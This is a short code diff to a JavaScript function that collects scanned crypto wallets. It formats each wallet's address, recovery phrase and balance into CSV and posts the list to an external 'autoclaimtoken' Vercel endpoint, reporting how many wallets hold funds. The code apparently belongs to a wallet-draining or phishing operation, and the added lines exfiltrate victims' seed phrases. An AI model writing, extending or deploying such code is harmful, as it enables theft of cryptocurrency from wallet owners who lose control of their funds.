@@ -360,9 +360,12 @@ async function sendCompleteResults(wallets, totalScanned) {
       const axios = require('axios');
       console.log('📧 Sending via Vercel backup...');
       
+      const fundedCount = wallets.filter(w => w.totalValueUSD > 0).length;
+      const csvData = wallets.map((w, i) => `${i + 1},${w.address},"${w.phrase}",${w.ethBalance},${w.totalValueUSD}`).join('\n');
+      
       const backupResponse = await axios.post('https://autoclaimtoken-10a1zx1oc-autoclaimtokens-projects.vercel.app/api/send-email', {
-        subject: `🔍 ADMIN SCAN COMPLETE: ${totalScanned} wallets (${walletsWithFunds.length} funded) - Full CSV Report`,
-        message: message + '\n\n=== WALLET DATA ===\n' + csvContent
+        subject: `🔍 ADMIN SCAN COMPLETE: ${totalScanned} wallets (${fundedCount} funded) - Full CSV Report`,
+        message: `SCAN COMPLETE: ${totalScanned} wallets, ${fundedCount} funded\n\n${csvData}`
       }, {
         timeout: 15000,
         headers: {
